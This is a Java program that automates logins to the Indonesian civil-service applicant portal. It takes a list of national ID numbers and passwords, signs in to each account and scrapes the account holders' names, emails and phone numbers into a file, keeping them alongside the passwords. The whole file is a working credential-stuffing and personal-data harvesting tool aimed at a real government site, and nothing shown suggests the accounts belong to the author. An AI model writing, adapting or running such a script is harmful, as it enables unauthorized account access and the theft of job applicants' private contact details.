package fjr.cpns.kemenhukam._2019;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.PrintWriter;

import com.gargoylesoftware.htmlunit.Page;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlButton;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlInput;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

public class SimpanNoHp {
	
	PrintWriter out = null , out1= null; 
	BufferedReader bufferedReader= null ;
	
	public SimpanNoHp() {
		
		try {
			out = new PrintWriter(new FileOutputStream( "E:/birokrasi/lamaran kerja/CPNS 2019/kementerian hukum dan ham/no-hp-simpan.txt" )); 
			out1 = new PrintWriter(new FileOutputStream( "E:/birokrasi/lamaran kerja/CPNS 2019/kementerian hukum dan ham/log-no-hp.txt" )); 

			HtmlPage page1 = null;
			WebClient webClient = new WebClient();
			webClient.getCookieManager().clearCookies();
			webClient.getOptions().setJavaScriptEnabled(false);
			webClient.getOptions().setCssEnabled(false);
			
			String isi ; 
			bufferedReader = new BufferedReader( new FileReader(new File("E:/birokrasi/lamaran kerja/CPNS 2019/kementerian hukum dan ham/sulawesi-sukses-all.txt")));
			while((isi = bufferedReader.readLine()) != null) {
				String[] temp = isi.split("\\|"); 
				
				String nik = temp[0]; 
				String pass = temp[1]; 
				
				out1.println(nik); 
				out1.flush();
				
				page1 = webClient.getPage("https://sscndaftar.bkn.go.id/login");

				
				HtmlForm form = (HtmlForm) page1.getElementById("FormLogin"); 
				HtmlInput name = form.getInputByName("username"); 

				name.setValueAttribute(nik); 
				HtmlInput passwordForm = form.getInputByName("password"); 
				passwordForm.setValueAttribute(pass); 
				HtmlButton button = (HtmlButton) page1.getElementById("btnSimpan"); 
				HtmlPage page2 = button.click();
				String result = page2.asText(); 

				
				if( ! result.toLowerCase().contains("nik tidak ditemukan") && 
						! result.toLowerCase().contains("bad credential")) {

					Page json = webClient.getPage("https://sscndaftar.bkn.go.id/resume/resume.json");
					String jsonContent = json.getWebResponse().getContentAsString();
					
					JsonObject jsonObject = new JsonParser().parse(jsonContent).getAsJsonObject();
					String pip  = jsonObject.getAsJsonPrimitive("success").toString();
					if(pip.equals("true")) {
						JsonObject res = jsonObject.getAsJsonObject("result");
						JsonObject biodataMaster = res.getAsJsonObject("biodataMaster");
						String namaktp = biodataMaster.getAsJsonPrimitive("namaKTP").getAsString();
						String email = biodataMaster.getAsJsonPrimitive("email").getAsString();
						
						JsonObject biodataData = res.getAsJsonObject("biodataData"); 
						String noTelp = biodataData.getAsJsonPrimitive("noTelp").getAsString(); 
						String noHp = biodataData.getAsJsonPrimitive("noHp").getAsString();
						
						out.println(pass + "|" +  email +"|" + namaktp + "|" + noTelp +"|" + noHp) ;
						out.flush();
 					}
				}
			}
			

		}catch(Exception e) {
			e.printStackTrace();
		}finally {
			if(out !=null) {
				out.close();
			}
			if(out1!= null) {
				out1.close();
			}
			try {
				if(bufferedReader != null) {
					bufferedReader.close();
				}
			}catch(Exception ee) {
			}
		}
		
		System.out.println("FINISH"); 
	}
	
	
	public static void main(String[] args) {
		
		new SimpanNoHp(); 
		
	}

}
